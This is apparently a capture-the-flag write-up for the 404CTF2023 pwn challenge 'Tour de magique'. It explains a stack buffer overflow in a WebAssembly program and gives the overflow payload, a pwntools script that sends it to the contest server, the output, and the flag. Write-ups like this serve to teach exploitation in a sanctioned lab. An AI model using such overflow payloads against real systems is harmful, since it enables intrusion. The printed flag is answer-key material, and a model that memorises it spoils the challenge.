---
title: CTFs | 404CTF2023 | Tour De Magique
author: Kaiba_404
date: 2023-06-05
categories: [CTFs, 404CTF2023, Tour De Magique]
tags: [CTF, 404CTF2023, pwn]
permalink: /CTFs/404CTF2023/pwn/tourdemagique
---


# Tour de magique

![tourde_magie](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/fe2455b8-6f8a-4509-85bc-d5c7b5805864)

We can download the zip file [tour-de-magie.zip](https://github.com/CongKhaiNGUYEN/congkhainguyen.github.io/tree/main/_posts/CTFs/404CTF2023/pwn/files/tour-de-magie.zip) from the challenge. 


After unzipping the downloaded file, it appears that the files provided are intended for running WebAssembly code. The main code is stored in the `main.c` file. To test the program, we can use the command `wasmtime main.wasm` in the terminal. This command executes the WebAssembly module main.wasm using the wasmtime runtime environment. This way, we can run and observe the behavior of the WebAssembly program.

After analyzing the code, I realize that there is a simple Buffer Overflow (BOF) vulnerability. From this information, I can construct a payload to exploit the vulnerability and retrieve the flag.

Based on the code in `main.c`, the payload can be constructed as follows:

`payload = b'A' * 16 + b'\x55\xda\xba\x50' + b'AAA'`

Here is my exploitation code:

```python
from pwn import *

# p = process(["./wasmtime","main.wasm"])
p = remote("challenges.404ctf.fr",30274)


p.recvuntil(b'magicien ?')
p.sendline(b'A'*16+p32(0x50bada55)+b'AAA')

print(p.recvall().decode())
```

```shell
$ python3 exploit.py 
[+] Opening connection to challenges.404ctf.fr on port 30274: Done
[+] Receiving all data: Done (119B)
[*] Closed connection to challenges.404ctf.fr port 30274

Wow ! Respect ! Quelles paroles enchantantes ! Voilà ta récompense...
404CTF{W0w_St4Ck_3cR4s3_l4_H34P_Qu3LL3_M4G13}
```

**Flag:** `404CTF{W0w_St4Ck_3cR4s3_l4_H34P_Qu3LL3_M4G13}`